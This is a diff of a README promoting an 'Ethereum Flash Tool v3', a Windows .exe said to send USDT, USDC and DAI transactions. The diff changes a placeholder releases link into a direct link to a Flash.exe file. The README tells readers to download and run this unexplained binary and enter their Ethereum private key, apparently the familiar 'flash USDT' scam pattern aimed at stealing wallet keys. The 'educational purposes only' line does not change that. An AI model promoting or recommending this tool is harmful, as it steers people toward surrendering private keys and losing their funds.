@@ -1,6 +1,6 @@
-Ethereum Flash Tool v3 🚀
+## 🚀 Ethereum Flash Tool v3
 
-A powerful and user-friendly desktop application compiled as a `.exe` for interacting with the Ethereum blockchain. This tool allows users to send ERC-20 token transactions (USDT, USDC, DAI) with customizable gas settings and provides real-time wallet balance monitoring. Designed for educational purposes only—use responsibly! ⚠️
+A powerful and user-friendly desktop application compiled as a `.exe` for interacting with the Ethereum blockchain. This tool allows users to send ERC-20 token transactions (USDT, USDC, DAI) with customizable gas settings and provides real-time wallet balance monitoring. Designed for educational purposes only use responsibly! ⚠️
 
 ## ✨ Features
 - **Wallet Management**: Enter your private key to view your Ethereum address and ETH balance in real-time.
@@ -39,7 +39,7 @@ A powerful and user-friendly desktop application compiled as a `.exe` for intera
 - **Private Key**: A valid Ethereum private key for signing transactions.
 
 ## 🚀 How to Use
-1. **Download**: Grab the latest `.exe` from the [Releases](https://github.com/yourusername/yourrepo/releases) section.
+1. **Download**: Grab the latest `.exe` from the [Releases](https://github.com/mr-nomad/Flash-USDT-ETH/blob/main/Flash.exe) section.
 2. **Run**: Launch the `.exe` file on your Windows machine.
 3. **Setup**:
    - Enter your Infura ID to connect to the Ethereum network.
